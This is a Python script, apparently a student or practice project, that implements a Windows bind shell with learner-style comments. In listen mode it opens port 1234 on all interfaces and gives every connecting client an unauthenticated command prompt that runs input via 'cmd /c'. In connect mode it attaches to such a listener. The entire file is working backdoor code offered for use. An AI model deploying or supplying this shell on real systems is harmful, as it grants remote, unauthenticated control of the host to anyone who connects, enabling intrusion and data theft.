#Bind-Shell
import socket, subprocess, threading, argparse

DEFAULT_PORT= 1234 # defualt port
MAX_BUFFER = 4096 # max buffer size


def execute_cmd(cmd):
    
    try: # executes the command and if its executed correctly, it saves the output in the output variable
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)

    except: #CalledProcessError
        output = b"Command failed!" # if the command is wrong, save in the output -> "Command Failed!"


    return output # return the output



def decode_and_strip(s):
    return s.decode("latin-1").strip() # decoding and stripping received data in a socket.



# We will use threading because we want more than one user to connect to the Bind Shell and use it


# The Shell Thread (to be able to exec commands)
def shell_thread(s):
    
    s.send(b"[-- Connected! --]") # Sends to the user that he is Successfully connected
    try:
        while True: # an Infinite loop of commands execution while the connection is still up.
            s.send(b"\r\nEnter Command> ") # Sends to the user to enter a command

            data = s.recv(MAX_BUFFER) # the buffer then reveives the sent data and stores it.

            if data: # if there is data
                buffer = decode_and_strip(data) 

                if not buffer or buffer.lower() == "exit":  # if the buffer is empty or the user want to exit the shell:
                    s.close() 
                    exit()    

            print("> Executing command: '{}'".format(buffer)) 
            s.send(execute_cmd(buffer)) # execute the send command by the execute_cmd function (server side) (sending the output from the function to the client)

    except: # if nothing of the above is true end the client connection and exit.
        s.close()
        exit()        


# Sending Thread
def send_thread(s):

    try:
        while True: # an infinite loop of receiving data.
            data = input() + "\n" 
            s.send(data.encode("latin-1"))

    except: # if not close and exit.
        s.close()
        exit()


# Receiving Thread
def recv_thread(s):

    try:
        while True: 
            data = decode_and_strip(s.recv(MAX_BUFFER)) 
            if data: # if there is data print it.
                print("\n" + data, end="", flush=True)


    except: #if not close and exit.
        s.close()
        exit()   

# Defining the server socket, the server will listen to the requests, then when a client connects it gives him access to shell_thread
def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 , connection-oriented
    s.bind(("0.0.0.0", DEFAULT_PORT)) # binds the socket to the default ip and port
    s.listen() # listen for incoming connections 

    print("[-- Starting Bind Shell! --]")      #prints this line on the server side (listener)                      

    while True: # infinite loop of accepting connections
        client_socket, adrr = s.accept()  #((return values of accept are a pair of a new socket object)) (server side socket object to represent the connection to a specific client, important to provide birdirectional connection, isolation between clients, etc ...)
        print("[-- New User Connected! --]") # print on the server side that a new client has connected
        threading.Thread(target=shell_thread,args=(client_socket,)).start() # start the shell thread on the client side (client_socket).


# for the client function, we want the client to be able to connect, and Send and Receive data at the same time
        # This is possible by the use of multiple threads
def client(ip):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,DEFAULT_PORT))

    print("[-- Connecting to Bind Shell! --]")
    threading.Thread(target=send_thread,args=(s,)).start()
    threading.Thread(target=recv_thread,args=(s,)).start()



# Arg parse for parsing arguments while running the program and to specify some options .
    
parser = argparse.ArgumentParser() # creating the parser

# adding the arguments 
parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)

parser.add_argument("-c","--connect",help="Connect to a bind shell",required=False)

#parsing args to the args variable, running the program will now have some options depending on this object 
args  = parser.parse_args() #

#specifing the actions depending on the parsed args in the terminal.
if args.listen:
    server()

elif args.connect:
    client(args.connect) # start the client and take the IP   